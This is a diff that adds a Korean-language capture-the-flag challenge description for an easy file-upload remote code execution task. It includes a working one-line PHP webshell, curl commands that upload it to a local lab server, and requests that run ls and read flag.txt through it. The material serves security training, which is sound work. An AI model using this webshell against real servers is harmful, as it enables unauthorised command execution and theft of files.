@@ -1,0 +1,20 @@
+📌 문제 제목
+File Upload RCE - Easy
+
+🎯 문제 설명
+파일 업로드 기능이 있는 웹 서버가 있습니다.
+이 서버는 업로드된 파일을 그대로 실행 가능한 위치에 저장합니다.
+
+이를 이용해 웹쉘을 업로드하고, 서버의 `flag.txt` 파일을 읽어보세요.
+
+🧠 난이도
+하 (Easy)
+
+💡 예시 공격
+1. shell.php 업로드
+2. http://host:8000/uploads/shell.php?cmd=cat flag.txt
+
+echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
+curl -F 'file=@shell.php' http://192.168.1.203:8000/upload.php
+curl "http://192.168.1.203:8000/uploads/shell.php?cmd=ls"
+curl "http://192.168.219.136:8000/uploads/shell.php?cmd=cat%20../flag.txt"
